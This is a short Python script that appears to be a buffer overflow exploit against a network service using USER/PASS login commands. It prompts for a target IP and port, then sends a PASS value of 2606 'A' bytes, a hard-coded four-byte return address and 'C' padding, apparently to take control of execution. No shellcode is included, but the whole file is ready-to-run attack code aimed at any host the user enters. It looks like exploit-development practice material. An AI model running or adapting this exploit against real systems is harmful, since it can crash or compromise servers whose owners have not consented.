#!/usr/bin/python3
import sys,socket

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")


if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    size=b"A" * 2606 + b"\x8f\x35\x4a\x5f" + b"C" *(3100-4-2606)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send(b"USER hrishi" + b"\r\n") 
    s.send(b"PASS " + size + b"\r\n") 
    s.close()

